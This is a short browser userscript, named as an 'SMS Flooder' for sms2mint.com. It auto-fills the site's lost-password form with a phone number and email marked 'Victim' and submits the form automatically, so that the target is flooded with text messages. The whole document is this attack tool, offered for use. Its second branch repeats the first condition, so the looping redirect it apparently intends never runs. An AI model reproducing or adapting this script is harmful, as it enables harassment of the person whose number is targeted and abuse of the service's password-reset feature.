// ==UserScript==
// @name           SMS2MINT SMS Flooder BY SUNNY020
// @namespace      SUNNY020
// @description    SMS Flooder
// @include        http://*sms2mint.com/*
// ==/UserScript==

var CustomerLogin="8051210009"; //Victim
var CustomerEmail="abab@gmail.com"; //Victim's email

if(document.location=="http://m.sms2mint.com/users/lossPassword")
{
	document.forms[0].elements[1].value=CustomerLogin;
	document.forms[0].elements[2].value=CustomerEmail;
	document.forms[0].elements[3].click();
}
else if(document.location=="http://m.sms2mint.com/users/lossPassword")
{
	document.location="http://m.sms2mint.com/users/lossPassword";
}